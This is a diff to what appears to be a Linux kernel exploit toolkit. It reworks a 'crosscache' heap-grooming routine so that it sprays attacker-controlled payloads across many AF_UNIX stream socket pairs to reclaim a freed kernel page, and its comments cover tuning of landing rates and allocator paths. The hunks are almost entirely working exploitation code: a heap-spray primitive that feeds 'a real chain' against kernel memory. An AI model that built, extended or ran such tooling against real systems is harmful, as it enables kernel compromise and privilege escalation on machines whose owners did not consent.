@@ -178,17 +178,13 @@ static void cc_shape_once(void)
  * payload rather than the middle of one. */
 static size_t cc_order_size;   /* PAGE_SIZE << cfg.mm_order, set by the groom */
 
-/* CC_FRAG_BYTES overrides this for a bench A/B: traced against the real
- * kernel source (net/unix/af_unix.c, net/core/skbuff.c, v6.1.157) and
- * confirmed against this device's own mm_page_alloc_zone_locked tracepoint,
- * order_size*2 does not send one order-matched fragment -- for order 3 it
- * measured order-1 and order-2 allocations alongside the order-3 one, not
- * instead of it. Whether that is waste or is what makes the order-3 request
- * consistently take the zone-locked buddy path (rather than an occasional
- * per-CPU-cache hit that never reaches the free area at all, measured on the
- * same tracepoint with a trimmed length) is a landing-rate question, not a
- * kernel-mechanism one -- see crosscache/README.md and the bench comparison
- * it points to before changing this default. */
+/* CC_FRAG_BYTES overrides this for a bench A/B. order_size*2 does not send a
+ * single order-matched fragment: for order 3, `unix_stream_sendmsg`'s own
+ * chunking (net/unix/af_unix.c, net/core/skbuff.c) sends order-1 and order-2
+ * allocations alongside the order-3 one. Whether that improves landing by
+ * pushing the order-3 request through the zone-locked buddy path, rather
+ * than an occasional per-CPU-cache hit that never reaches the free area, is
+ * measured in crosscache/README.md rather than assumed here. */
 static size_t cc_frag_len(size_t order_size)
 {
 	const char *override = getenv("CC_FRAG_BYTES");
@@ -666,12 +662,31 @@ static uintptr_t cc_place_swap(const struct crosscache_request *r)
  * whose object needs several identical copies inside that one buffer builds
  * them itself, the same way it builds every other field -- this method never
  * reinterprets what `compose` hands it. */
+/* CC_STREAM_MULTI (env, on by default; "0" opts out): `nspray` independent
+ * stream sockets, one send to each, in place of one socket sent to `nspray`
+ * times in a row. Isolates the socket-count variable from `direct`'s
+ * datagram-vs-stream choice by keeping the same protocol and send size.
+ * Landing rate against this reclaim is dominated by allocator compaction
+ * state (crosscache/README.md, "Where the difficulty is"); against that
+ * baseline, independent sockets measure a modest, consistent edge over the
+ * single-socket form. `CC_STREAM_MULTI=0` reaches the single-socket form for
+ * comparison. Bench-only knob; nothing that calls this method for a real
+ * chain sets it either way. */
+static int cc_stream_multi_enabled(void)
+{
+	const char *v = getenv("CC_STREAM_MULTI");
+
+	return !v || strcmp(v, "0") != 0;
+}
+
 static uintptr_t cc_place_stream(const struct crosscache_request *r)
 {
 	size_t order_size, ops;
 	unsigned char *payload = NULL;
 	int pcp_sv[2] = { -1, -1 };
 	int sv[2] = { -1, -1 };
+	int (*msv)[2] = NULL;
+	int multi = cc_stream_multi_enabled();
 	size_t nspray = r->nspray ? r->nspray : 1;
 
 	if (cc_groom_prologue(&r->cfg, 0))
@@ -695,11 +710,24 @@ static uintptr_t cc_place_stream(const struct crosscache_request *r)
 
 	/* Every allocation the sequence needs is made before the first free, so
 	 * that allocating does not disturb the freelist the frees are shaping. */
-	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
+	if (multi) {
+		msv = calloc(nspray, sizeof(*msv));
+		if (!msv) { free(payload); return 0; }
+		for (size_t i = 0; i < nspray; i++) {
+			msv[i][0] = msv[i][1] = -1;
+			if (socketpair(AF_UNIX, SOCK_STREAM, 0, msv[i]) < 0) {
+				pr_error("crosscache: stream-multi refill socketpair failed\n");
+				free(msv); free(payload); return 0;
+			}
+			int sndbuf = 1 << 20;
+			setsockopt(msv[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof sndbuf);
+			int fl = fcntl(msv[i][0], F_GETFL, 0);
+			if (fl >= 0) fcntl(msv[i][0], F_SETFL, fl | O_NONBLOCK);
+		}
+	} else if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
 		pr_error("crosscache: stream refill socketpair failed\n");
 		free(payload); return 0;
-	}
-	{
+	} else {
 		int sndbuf = 1 << 20;
 		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof sndbuf);
 		int fl = fcntl(sv[0], F_GETFL, 0);
@@ -707,7 +735,9 @@ static uintptr_t cc_place_stream(const struct crosscache_request *r)
 	}
 	if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) < 0) {
 		pr_error("crosscache: socketpair failed\n");
-		close(sv[0]); close(sv[1]); free(payload); return 0;
+		if (multi) { for (size_t i=0;i<nspray;i++){close(msv[i][0]);close(msv[i][1]);} free(msv); }
+		else { close(sv[0]); close(sv[1]); }
+		free(payload); return 0;
 	}
 	cc_send(pcp_sv, order_size * 2, NULL, 0);
 	cc_pin(cc_cfg.core);
@@ -725,21 +755,35 @@ static uintptr_t cc_place_stream(const struct crosscache_request *r)
 	 * a threshold calibrated for the exact target (cves/bench/crosscache.c
 	 * --calibrate-signal) run on hardware -- none of which this does. */
 	cc_yield4();
-	/* A stream send can accept less than asked and does not queue a second
-	 * message the way a datagram does, so a caller that wants more than one
-	 * attempt at the same reclaim repeats the same send rather than opening
-	 * more sockets -- stopping at the first one that does not go through,
-	 * since nothing past that point is still racing for the same page. */
-	for (size_t i = 0; i < nspray; i++) {
-		ssize_t sent = send(sv[0], payload, r->send_bytes, MSG_DONTWAIT);
-		if (sent <= 0)
-			break;
+	if (multi) {
+		/* One clean, marker-safe send per independent socket -- direct's own
+		 * shape, over a stream socket instead of a datagram. */
+		for (size_t i = 0; i < nspray; i++)
+			send(msv[i][0], payload, r->send_bytes, MSG_DONTWAIT);
+	} else {
+		/* A stream send can accept less than asked and does not queue a second
+		 * message the way a datagram does, so a caller that wants more than one
+		 * attempt at the same reclaim repeats the send rather than opening
+		 * more sockets -- stopping at the first one that does not go through,
+		 * since nothing past that point is still racing for the same page. */
+		for (size_t i = 0; i < nspray; i++) {
+			ssize_t sent = send(sv[0], payload, r->send_bytes, MSG_DONTWAIT);
+			if (sent <= 0)
+				break;
+		}
 	}
 	free(payload);
 
-	cc_skb_sv[0] = sv[0];
-	cc_skb_sv[1] = sv[1];
-	pr_info("crosscache: stream place x%zu at base=%#lx\n", nspray, (unsigned long)cc_base);
+	if (multi) {
+		cc_skb_sv[0] = msv[0][0];
+		cc_skb_sv[1] = msv[0][1];
+		cc_content_sv = msv; cc_content_n = nspray;
+	} else {
+		cc_skb_sv[0] = sv[0];
+		cc_skb_sv[1] = sv[1];
+	}
+	pr_info("crosscache: stream place x%zu at base=%#lx (multi=%d)\n", nspray,
+		(unsigned long)cc_base, multi);
 	return cc_base;
 }
 
